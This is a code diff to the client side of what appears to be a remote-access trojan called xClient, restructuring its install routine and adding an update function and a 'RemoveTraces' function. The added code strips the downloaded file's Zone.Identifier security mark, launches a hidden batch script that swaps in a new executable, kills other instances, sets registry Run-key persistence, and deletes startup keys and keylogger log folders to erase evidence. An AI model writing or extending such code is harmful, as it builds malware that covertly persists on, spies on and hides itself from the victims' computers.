@@ -17,6 +17,10 @@ namespace xClient.Core
 {
     public static class SystemCore
     {
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool DeleteFile(string name);
+
         [DllImport("user32.dll")]
         private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
 
@@ -57,7 +61,7 @@ namespace xClient.Core
             "ws.png", "ye.png", "yt.png", "za.png", "zm.png", "zw.png"
         };
 
-        public static bool Disconnect = false;
+        public static bool Disconnect = false; // when Disconnect is true, stop all running threads
         public static string OperatingSystem = string.Empty;
         public static string MyPath = string.Empty;
         public static string InstallPath = string.Empty;
@@ -400,45 +404,8 @@ namespace xClient.Core
             return (idleTime > 600); // idle for 10 minutes
         }
 
-        public static void Install()
+        public static void AddToStartup()
         {
-            bool isKilled = false;
-
-            // create target dir
-            if (!Directory.Exists(Path.Combine(Settings.DIR, Settings.SUBFOLDER)))
-                Directory.CreateDirectory(Path.Combine(Settings.DIR, Settings.SUBFOLDER));
-
-            // delete existing file
-            if (File.Exists(InstallPath))
-            {
-                try
-                {
-                    File.Delete(InstallPath);
-                }
-                catch (Exception ex)
-                {
-                    if (ex is IOException || ex is UnauthorizedAccessException)
-                    {
-                        // kill old process if new mutex
-                        Process[] foundProcesses =
-                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(InstallPath));
-                        int myPid = Process.GetCurrentProcess().Id;
-                        foreach (var prc in foundProcesses)
-                        {
-                            if (prc.Id == myPid) continue;
-                            prc.Kill();
-                            isKilled = true;
-                        }
-                    }
-                }
-            }
-
-            if (isKilled) Thread.Sleep(5000);
-
-            //copy client to target dir
-            File.Copy(MyPath, InstallPath, true);
-
-            //add to startup
             if (Settings.STARTUP)
             {
                 if (AccountType == "Admin")
@@ -493,6 +460,48 @@ namespace xClient.Core
                     }
                 }
             }
+        }
+
+        public static void Install(bool addToStartup = true)
+        {
+            bool isKilled = false;
+
+            // create target dir
+            if (!Directory.Exists(Path.Combine(Settings.DIR, Settings.SUBFOLDER)))
+                Directory.CreateDirectory(Path.Combine(Settings.DIR, Settings.SUBFOLDER));
+
+            // delete existing file
+            if (File.Exists(InstallPath))
+            {
+                try
+                {
+                    File.Delete(InstallPath);
+                }
+                catch (Exception ex)
+                {
+                    if (ex is IOException || ex is UnauthorizedAccessException)
+                    {
+                        // kill old process if new mutex
+                        Process[] foundProcesses =
+                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(InstallPath));
+                        int myPid = Process.GetCurrentProcess().Id;
+                        foreach (var prc in foundProcesses)
+                        {
+                            if (prc.Id == myPid) continue;
+                            prc.Kill();
+                            isKilled = true;
+                        }
+                    }
+                }
+            }
+
+            if (isKilled) Thread.Sleep(5000);
+
+            //copy client to target dir
+            File.Copy(MyPath, InstallPath, true);
+
+            if (addToStartup)
+                AddToStartup();
 
             if (Settings.HIDEFILE)
             {
@@ -516,6 +525,129 @@ namespace xClient.Core
             Process.Start(startInfo);
 
             Disconnect = true;
+        }
+
+        public static void UpdateClient(Client c, string newFile)
+        {
+            try
+            {
+                DeleteFile(newFile + ":Zone.Identifier");
+
+                var bytes = File.ReadAllBytes(newFile);
+                if (bytes[0] != 'M' && bytes[1] != 'Z')
+                    throw new Exception("no pe file");
+
+                string filename = Path.Combine(
+                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                    Helper.Helper.GetRandomFilename(12, ".bat"));
+
+                string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
+                    ? "@echo off" + "\n" +
+                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
+                      "ping -n 20 localhost > nul" + "\n" +
+                      "del /A:H " + "\"" + MyPath + "\"" + "\n" +
+                      "move " + "\"" + newFile + "\"" + " " + "\"" + MyPath + "\"" + "\n" +
+                      "start \"\" " + "\"" + MyPath + "\"" + "\n" +
+                      "del " + "\"" + filename + "\""
+                    : "@echo off" + "\n" +
+                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
+                      "ping -n 20 localhost > nul" + "\n" +
+                      "del " + "\"" + MyPath + "\"" + "\n" +
+                      "move " + "\"" + newFile + "\"" + " " + "\"" + MyPath + "\"" + "\n" +
+                      "start \"\" " + "\"" + MyPath + "\"" + "\n" +
+                      "del " + "\"" + filename + "\""
+                    ;
+
+                File.WriteAllText(filename, uninstallBatch);
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                    UseShellExecute = true,
+                    FileName = filename
+                };
+                Process.Start(startInfo);
+
+                Disconnect = true;
+                c.Disconnect();
+                RemoveTraces();
+            }
+            catch (Exception ex)
+            {
+                DeleteFile(newFile);
+                new Packets.ClientPackets.Status(string.Format("Update failed: {0}", ex.Message)).Execute(c);
+            }
+        }
+
+        public static void RemoveTraces()
+        {
+            if (Settings.STARTUP)
+            {
+                if (AccountType == "Admin")
+                {
+                    try
+                    {
+                        using (
+                            RegistryKey key =
+                                Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                    true))
+                        {
+                            if (key != null)
+                            {
+                                key.DeleteValue(Settings.STARTUPKEY, true);
+                                key.Close();
+                            }
+                        }
+                    }
+                    catch
+                    {
+                        // try deleting from Registry.CurrentUser
+                        using (
+                            RegistryKey key =
+                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                    true))
+                        {
+                            if (key != null)
+                            {
+                                key.DeleteValue(Settings.STARTUPKEY, true);
+                                key.Close();
+                            }
+                        }
+                    }
+                }
+                else
+                {
+                    try
+                    {
+                        using (
+                            RegistryKey key =
+                                Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                    true))
+                        {
+                            if (key != null)
+                            {
+                                key.DeleteValue(Settings.STARTUPKEY, true);
+                                key.Close();
+                            }
+                        }
+                    }
+                    catch
+                    {
+                    }
+                }
+            }
+
+            string logsDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
+            if (Directory.Exists(logsDirectory)) // try to delete Logs from Keylogger
+            {
+                try
+                {
+                    Directory.Delete(logsDirectory, true);
+                }
+                catch
+                {
+                }
+            }
         }
     }
 }
